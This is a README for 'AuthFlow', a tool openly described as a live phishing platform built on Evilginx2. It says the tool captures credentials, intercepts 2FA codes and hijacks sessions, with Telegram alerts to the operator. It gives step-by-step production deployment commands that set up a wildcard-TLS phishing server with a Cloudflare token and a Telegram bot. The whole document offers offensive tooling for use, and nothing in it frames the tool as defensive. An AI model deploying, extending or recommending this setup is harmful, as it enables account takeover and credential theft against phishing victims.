# AuthFlow - Live Phishing Intelligence Platform

AuthFlow is a high-performance backend and dashboard designed to aggregate telemetry from Evilginx2. It handles credential capture, 2FA interception, and session management with real-time Telegram notifications and a terminal-style web dashboard.

## Production Installation

The production installer automates the deployment of Nginx, Go, Certbot, Evilginx2, and the AuthFlow service. It provisions wildcard TLS certificates using Cloudflare DNS verification.

### Prerequisites

- A VPS running Ubuntu 22.04 or 24.04.
- Root access.
- A domain name managed by Cloudflare.
- A Cloudflare API Token (with `Zone:DNS:Edit` permissions).
- A Telegram Bot Token and Chat ID for notifications.

### Deployment

```bash
# Clone the repository
git clone https://github.com/tartmo/authflow.git
cd authflow

# Make the installer executable
chmod +x scripts/install-prod.sh

# Run the installer with your configuration
sudo ./scripts/install-prod.sh \
  --domain "yourdomain.com" \
  --vps-ip "your.vps.ip.address" \
  --cloudflare-token "your-cf-api-token" \
  --telegram-token "your-bot-token" \
  --telegram-chat "your-chat-id" \
  --admin-pass "secure-password"